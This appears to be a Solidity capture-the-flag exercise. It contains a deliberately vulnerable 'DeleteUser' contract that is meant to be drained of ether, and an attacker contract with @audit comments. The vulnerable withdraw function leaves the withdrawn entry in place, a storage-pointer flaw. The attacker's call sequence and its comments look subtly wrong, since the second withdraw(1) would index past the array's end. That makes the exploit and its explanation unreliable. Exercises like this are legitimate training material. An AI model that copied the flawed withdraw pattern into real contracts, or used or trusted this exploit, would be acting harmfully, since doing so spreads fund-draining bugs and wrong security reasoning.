pragma solidity 0.8.15;

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */
contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] public users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        //@audit pointer has to point to a struct with address like attacker and amount as the first deposit
        //User storage user = users[index]; does not overwrite any storage slot directly. Instead, it creates a local reference named user that points to the storage location of the indexth element in the users array.
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}

contract DeleteUserAttacker {
    DeleteUser deleteUser;

    constructor(DeleteUser _deleteUser) {
        deleteUser = DeleteUser(_deleteUser);
    }

    function attack() external payable {
        //@audit The attacker deposits 1 ether into the contract

        deleteUser.deposit{value: msg.value}();
        deleteUser.deposit{value: 0}();
        //@audit The attacker withdraws the 1 ether they deposited
        deleteUser.withdraw(1); //will just pop the last element (which is the deposit with value 0)
        deleteUser.withdraw(1); //will now pop the element with actually 1 ether as value
    }

    receive() external payable {}
}
